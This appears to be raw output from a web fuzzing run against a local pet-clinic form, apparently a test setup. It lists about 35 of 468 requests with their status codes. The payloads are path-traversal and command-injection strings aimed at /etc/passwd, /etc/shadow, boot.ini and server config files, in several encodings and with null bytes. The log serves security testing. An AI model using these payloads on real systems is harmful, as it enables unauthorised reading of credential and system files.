Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
Total requests: 468
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00028:  C=400     11 L	     136 W	   2206 Ch	  "\0\0\0 - \0\0\0 - \0\0\0 - \0\0\0 - \0\0\0"
00090:  C=200    174 L	     307 W	   5129 Ch	  "%0a/bin/cat%20/etc/shadow - %0a/bin/cat%20/etc/shadow - %0a/bin/cat%20/etc/shadow - %0a/bin/cat%20/etc/shadow - %0a/bin/cat%20/etc/shadow"
00084:  C=400     11 L	     136 W	   2826 Ch	  ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow - .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow - .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow - .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow - .\\./.\\./.\\./.\\./.\\./.\\./etc/shadow"
00081:  C=400     11 L	     136 W	   2936 Ch	  "/..\../..\../..\../..\../..\../..\../etc/passwd - /..\../..\../..\../..\../..\../..\../etc/passwd - /..\../..\../..\../..\../..\../..\../etc/passwd - /..\../..\../..\../..\../..\../..\../etc/passwd - /..\../..\../..\../..\../..\../..\../etc/passwd"
00083:  C=400     11 L	     136 W	   2826 Ch	  ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd - .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd - .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd - .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd - .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd"
00080:  C=400     11 L	     136 W	   2546 Ch	  "..\..\..\..\..\..\..\..\..\..\etc\shadow - ..\..\..\..\..\..\..\..\..\..\etc\shadow - ..\..\..\..\..\..\..\..\..\..\etc\shadow - ..\..\..\..\..\..\..\..\..\..\etc\shadow - ..\..\..\..\..\..\..\..\..\..\etc\shadow"
00077:  C=400     11 L	     136 W	   2556 Ch	  "\..\..\..\..\..\..\..\..\..\..\etc\passwd - \..\..\..\..\..\..\..\..\..\..\etc\passwd - \..\..\..\..\..\..\..\..\..\..\etc\passwd - \..\..\..\..\..\..\..\..\..\..\etc\passwd - \..\..\..\..\..\..\..\..\..\..\etc\passwd"
00079:  C=400     11 L	     136 W	   2546 Ch	  "..\..\..\..\..\..\..\..\..\..\etc\passwd - ..\..\..\..\..\..\..\..\..\..\etc\passwd - ..\..\..\..\..\..\..\..\..\..\etc\passwd - ..\..\..\..\..\..\..\..\..\..\etc\passwd - ..\..\..\..\..\..\..\..\..\..\etc\passwd"
00113:  C=400     11 L	     136 W	   2256 Ch	  "C:\boot.ini - C:\boot.ini - C:\boot.ini - C:\boot.ini - C:\boot.ini"
00111:  C=400     11 L	     136 W	   2436 Ch	  "C:\inetpub\wwwroot\global.asa - C:\inetpub\wwwroot\global.asa - C:\inetpub\wwwroot\global.asa - C:\inetpub\wwwroot\global.asa - C:\inetpub\wwwroot\global.asa"
00109:  C=400     11 L	     136 W	   2866 Ch	  "/../../../../../../../../bin/id| - /../../../../../../../../bin/id| - /../../../../../../../../bin/id| - /../../../../../../../../bin/id| - /../../../../../../../../bin/id|"
00091:  C=200    174 L	     307 W	   5129 Ch	  "%00/etc/passwd%00 - %00/etc/passwd%00 - %00/etc/passwd%00 - %00/etc/passwd%00 - %00/etc/passwd%00"
00116:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../boot.ini%00 - ../../../../../../../../../../../../boot.ini%00 - ../../../../../../../../../../../../boot.ini%00 - ../../../../../../../../../../../../boot.ini%00 - ../../../../../../../../../../../../boot.ini%00"
00093:  C=200    174 L	     307 W	   5129 Ch	  "%00../../../../../../etc/passwd - %00../../../../../../etc/passwd - %00../../../../../../etc/passwd - %00../../../../../../etc/passwd - %00../../../../../../etc/passwd"
00097:  C=200    174 L	     307 W	   5129 Ch	  "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
00105:  C=200    174 L	     307 W	   5129 Ch	  "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini"
00107:  C=400     11 L	     136 W	   2766 Ch	  "\\&apos;/bin/cat%20/etc/shadow\\&apos; - \\&apos;/bin/cat%20/etc/shadow\\&apos; - \\&apos;/bin/cat%20/etc/shadow\\&apos; - \\&apos;/bin/cat%20/etc/shadow\\&apos; - \\&apos;/bin/cat%20/etc/shadow\\&apos;"
00115:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../localstart.asp - ../../../../../../../../../../../../localstart.asp - ../../../../../../../../../../../../localstart.asp - ../../../../../../../../../../../../localstart.asp - ../../../../../../../../../../../../localstart.asp"
00114:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../../../../../localstart.asp%00 - ../../../../../../../../../../../../localstart.asp%00 - ../../../../../../../../../../../../localstart.asp%00 - ../../../../../../../../../../../../localstart.asp%00 - ../../../../../../../../../../../../localstart.asp%00"
00112:  C=200    174 L	     307 W	   5129 Ch	  "C:/boot.ini - C:/boot.ini - C:/boot.ini - C:/boot.ini - C:/boot.ini"
00110:  C=200    174 L	     307 W	   5129 Ch	  "C:/inetpub/wwwroot/global.asa - C:/inetpub/wwwroot/global.asa - C:/inetpub/wwwroot/global.asa - C:/inetpub/wwwroot/global.asa - C:/inetpub/wwwroot/global.asa"
00106:  C=400     11 L	     136 W	   2766 Ch	  "\\&apos;/bin/cat%20/etc/passwd\\&apos; - \\&apos;/bin/cat%20/etc/passwd\\&apos; - \\&apos;/bin/cat%20/etc/passwd\\&apos; - \\&apos;/bin/cat%20/etc/passwd\\&apos; - \\&apos;/bin/cat%20/etc/passwd\\&apos;"
00108:  C=200    174 L	     307 W	   5129 Ch	  "../../../../../../../../conf/server.xml - ../../../../../../../../conf/server.xml - ../../../../../../../../conf/server.xml - ../../../../../../../../conf/server.xml - ../../../../../../../../conf/server.xml"
00104:  C=200    174 L	     307 W	   5129 Ch	  "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini"
00103:  C=200    174 L	     307 W	   5129 Ch	  "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00"
00102:  C=200    174 L	     307 W	   5129 Ch	  "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
00101:  C=200    174 L	     307 W	   5129 Ch	  "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00 - %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
00123:  C=400     11 L	     136 W	   2536 Ch	  "\..\..\..\..\..\..\..\..\..\..\boot.ini - \..\..\..\..\..\..\..\..\..\..\boot.ini - \..\..\..\..\..\..\..\..\..\..\boot.ini - \..\..\..\..\..\..\..\..\..\..\boot.ini - \..\..\..\..\..\..\..\..\..\..\boot.ini"
00096:  C=200    174 L	     307 W	   5129 Ch	  "/../../../../../../../../../../../etc/passwd%00.html - /../../../../../../../../../../../etc/passwd%00.html - /../../../../../../../../../../../etc/passwd%00.html - /../../../../../../../../../../../etc/passwd%00.html - /../../../../../../../../../../../etc/passwd%00.html"
00100:  C=200    174 L	     307 W	   5129 Ch	  "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
00099:  C=200    174 L	     307 W	   5129 Ch	  "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
00092:  C=200    174 L	     307 W	   5129 Ch	  "%00/etc/shadow%00 - %00/etc/shadow%00 - %00/etc/shadow%00 - %00/etc/shadow%00 - %00/etc/shadow%00"
00094:  C=200    174 L	     307 W	   5129 Ch	  "%00../../../../../../etc/shadow - %00../../../../../../etc/shadow - %00../../../../../../etc/shadow - %00../../../../../../etc/shadow - %00../../../../../../etc/shadow"
00146:  C=400     11 L	     136 W	   2196 Ch	  "\\\\* - \\\\* - \\\\* - \\\\* - \\\\*"
00098:  C=200    174 L	     307 W	   5129 Ch	  "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow"
